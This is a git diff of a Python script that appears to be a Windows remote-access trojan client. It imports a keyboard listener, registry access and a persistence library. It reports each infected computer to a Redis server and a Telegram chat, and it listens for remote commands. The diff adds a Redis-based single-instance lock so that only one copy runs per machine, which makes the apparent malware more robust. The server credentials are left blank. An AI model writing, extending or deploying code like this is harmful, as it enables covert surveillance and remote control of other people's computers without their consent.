@@ -8,13 +8,15 @@ import uuid
 import winreg
 from datetime import datetime, timezone
 from webbrowser import open as open_browser
+import sys
+import atexit
 
 
 import redis
 import requests
 from gtts import gTTS
 from pynput import keyboard
-
+import win32event, win32api
 
 from libs.block_website import block_domains, unblock_domains
 from libs.files import FileManager
@@ -28,12 +30,14 @@ import libs.persistence as persistence_lib
 
 #REDIS CONF
 REDIS_HOST = ""
-REDIS_PORT = 0000 #PORT GOES HERE
+REDIS_PORT = 000 #PORT GOES HERE
 REDIS_PASS = ""
 
 #TELEGRAM CONF
 TELEGRAM_BOT_TOKEN = "" 
 NOTIFY_CHATID = "" 
+
+
 
 
 
@@ -65,6 +69,62 @@ def get_or_create_uuid():
 
 
 COMPUTER_ID = get_or_create_uuid()
+LOCK_KEY = f"computer_lock:{COMPUTER_ID}"
+
+INSTANCE_ID = str(uuid.uuid4())
+
+def check_single_instance():
+    """
+    Ensure only one instance of this script runs for the current computer.
+    """
+    try:
+        # Try to acquire the lock with a unique identifier
+        lock_acquired = redis_client.set(LOCK_KEY, INSTANCE_ID, nx=True, ex=300)
+        if not lock_acquired:
+            print(f"Another instance is already running for computer {COMPUTER_ID}. Exiting...")
+            sys.exit(0)  # Exit if lock is not acquired
+        else:
+            print(f"Lock acquired for computer {COMPUTER_ID} with instance ID {INSTANCE_ID}.")
+    except Exception as e:
+        print(f"[ERROR] Failed to acquire lock: {e}")
+        sys.exit(1)
+
+
+@atexit.register
+def release_lock():
+    """
+    Release the Redis lock on exit, but only if this instance owns the lock.
+    """
+    try:
+        lock_value = redis_client.get(LOCK_KEY)
+        if lock_value and lock_value == INSTANCE_ID:
+            redis_client.delete(LOCK_KEY)
+            print(f"Lock released for computer {COMPUTER_ID} with instance ID {INSTANCE_ID}.")
+        else:
+            print(f"Lock not owned by this instance. No action taken.")
+    except Exception as e:
+        print(f"[ERROR] Failed to release lock: {e}")
+
+
+async def refresh_lock():
+    """
+    Periodically refresh the Redis lock to ensure it doesn't expire during operation.
+    """
+    while True:
+        try:
+            lock_value = redis_client.get(LOCK_KEY)
+            if lock_value and lock_value == INSTANCE_ID:
+                redis_client.expire(LOCK_KEY, 300)  # Refresh TTL
+                print(f"Lock refreshed for computer {COMPUTER_ID} with instance ID {INSTANCE_ID}.")
+            else:
+                print(f"Lock not owned by this instance. Refresh skipped.")
+                break  # Exit refresh loop if lock is no longer owned
+        except Exception as e:
+            print(f"[ERROR] Failed to refresh lock: {e}")
+        await asyncio.sleep(120)  # Refresh every 2 minutes
+
+
+
 # Register command handlers
 COMMAND_HANDLERS = {}
 
@@ -82,7 +142,9 @@ async def send_status_update():
     while True:
         timestamp = datetime.now(timezone.utc).isoformat()  # Generate ISO 8601 timestamp
         redis_client.hset(REDIS_STATUS_CHANNEL, COMPUTER_ID, timestamp)
+        redis_client.expire(LOCK_KEY, 300)  # Refresh lock TTL
         await asyncio.sleep(2)  # Send update every 2 seconds
+
 
 
 async def command_listener():
@@ -1283,17 +1345,25 @@ async def main():
     """Main entry point for the local script."""
     print(f"Computer {COMPUTER_ID} is initializing...")
 
+    # Ensure only a single instance is running
+    check_single_instance()
+
+    # Start the lock refresh task
+    asyncio.create_task(refresh_lock())
+
     # Start registration immediately in a separate task
     asyncio.create_task(register_computer())
 
     await send_message(
-                    chat_id=NOTIFY_CHATID,
-                    text=f"{COMPUTER_ID} successfully connected!"
-                )
+        chat_id=NOTIFY_CHATID,
+        text=f"{COMPUTER_ID} successfully connected!"
+    )
 
     # Proceed with other tasks like command listener
     print(f"Starting command listener for {COMPUTER_ID}...")
     await asyncio.gather(send_status_update(), command_listener())
 
+
 if __name__ == "__main__":
     asyncio.run(main())
+
